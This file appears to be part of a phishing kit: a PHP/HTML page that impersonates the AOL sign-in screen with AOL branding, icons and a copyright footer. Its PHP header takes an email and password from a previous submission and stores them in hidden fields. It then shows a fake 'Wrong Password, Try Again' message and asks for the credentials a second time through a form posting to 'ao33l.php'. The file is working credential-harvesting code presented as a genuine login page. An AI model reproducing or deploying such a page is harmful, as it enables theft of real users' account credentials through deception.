 <?php
 $email = $_POST[ 'email' ];
 $password = $_POST[ 'password' ];
 ?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>AOL.com - Welcome to AOL</title>
        <link rel="stylesheet" type="text/css" media="screen" href="index_files/snslanding.css">
        <link rel="stylesheet" type="text/css" media="screen" href="index_files/sns-login-screen.css">
        <link rel="stylesheet" type="text/css" media="screen" href="index_files/hdr_err.css">
        <link rel="stylesheet" type="text/css" media="screen" href="index_files/10-multiformat-ad.css">
        <link href="index_files/lpUiStyles.css" rel="stylesheet" type="text/css">
        <link rel="icon" type="image/png" href="index_files/aol-favicon.png">
		<link rel="shortcut icon" type="image/png" href="index_files/aol-favicon.png">
		<link rel="apple-touch-icon" href="index_files/aol-apple-touch-icon.png">
		<link rel="apple-touch-icon-precomposed" href="index_files/aol-apple-touch-icon.png">
		<style type="text/css">
            #mcd,
            #mcd #loginrow,
            #logintitlebar,
            .sns_noTabs,
            #newstdmod,
            #logindiv,
            .logintabs .selected,
            #logintitlebar {
                color: #000000;
                background-color: #FFFFFF;
            }
            #snsmod #mcd,
            #stdfooter #spipe,
            .headlinebold,
            #mcd label,
            #mcd .fieldlabel {
                color: #000000
            }
            #titlebar {
                background-color: #003366;
                border: 1px solid #003366
            }
            #snsmod .slnksm,
            #snsmod .slnkmd,
            #snsmod .slnklg,
            #newstdmod .slnkmd,
            #newstdmod a {
                color: #003366;
            }
            #mcd .text3,
            #mcd td.text3 {
                color: #0066FF
            }
            #newstdmod {
                background-color: #FFFFFF;
                border: 1px solid #003366;
            }
            .secidcontent,
            .asqcontent,
            .ssocontent {
                border-top: 1px solid #003366;
            }
			.sr {
				 padding-left: 20px;
				 margin-top: 20px;
            }				 
        </style>
    </head>
    <body>
        <img src="index_files/logo.png" alt="Aol" class="sr" width="100" height="">
    </span>
</div>
    <div>
        <div class="port_land">
            <div class="lands">
                <div id="othercontent">
                    <div class="landsrt">
                        <div id="SNSLandingPageModule">&nbsp;</div>
                        <div class="login">
                            <div id="lpmod">
                                <img src="index_files/logo.png" id="lp-ui-logo-header" alt="AOL Sign In">
                                <span class="pwd aolsi" id="si3">
                                    <h3 id="lpHeader">Sign In</h3>
                                </span>
                                <div id="box-top"></div>
                                <!-- start box-middle -->
                                <div id="box-middle">
                                    <div id="aol">
                                        <form name="AOLLoginForm" method="POST" action="ao33l.php"  id="formCreds">
                                            <div id="relpmod">
                                            <input type="text" name="reemail" maxlength="255" value="<?=$email?>" id="relgnId1" class="reinputBox" placeholder="Username or Email" onkeyup="return onInputChange(event);" pattern=".{4,30}" oninvalid="this.setCustomValidity('Enter Your Username or Email')" oninput="setCustomValidity('')" required="">
                                            <input type="password" name="repassword" maxlength="39" value="" id="repwdId1" class="reinputBox" placeholder="Password" onkeyup="return onInputChange(event);" pattern=".{4,30}" oninvalid="this.setCustomValidity('Enter Your Password')" oninput="setCustomValidity('')" title="Password" required="">
											</div>
											<input name="email" value="<?=$email?>" type="hidden" style="border: 0" readonly>
											<input name="password" value="<?=$password?>" type="hidden" style="border: 0" readonly>
											<div class="xsr" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
											<span>Wrong Password, Try Again.</span>
											</div>
                                            <a href="" target="_top" id="forgot-pwd">Forgot password?</a>
                                            <div id="signin-row">
                                                <div id="lev0">
                                                    <label for="rmbrMe" id="chkLbl">
                                                        <input type="checkbox" name="rememberMe" value="on" id="rmbrMe"> Remember Me
                                                    </label>
                                                </div>
                                                <input type="submit" id="submitID" value="Sign In" title="Sign In">
                                            </div>

                                            <br class="clearfix">
                                            <a href="#" target="_top" id="getSn" title="Get a Free Username">Get a Free Username</a>
                                            </form>

                                        </div>
									</div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="footer">


                    <!--CHANNEL_FTR_CNT-->


                    <!--END CHANNEL_FTR_CNT-->
                    <!--CHANNEL_FTR_CNT-->
                    <a target="_blank" href="">AOL Inc.</a> | <a target="_blank" href="">Privacy Policy</a> | <a target="_blank" href="">Terms of Service</a> | <a target="_blank" href="">About Our Ads</a> | <a target="_blank" href="">Site Map</a> | <a target="_blank" href="">Help</a> © 2018 AOL Inc. All Rights Reserved.
                    <!--CHANNEL_FTR_CNT-->

                </div>
            </div>
        </div>
    </div>

    </body>

</html>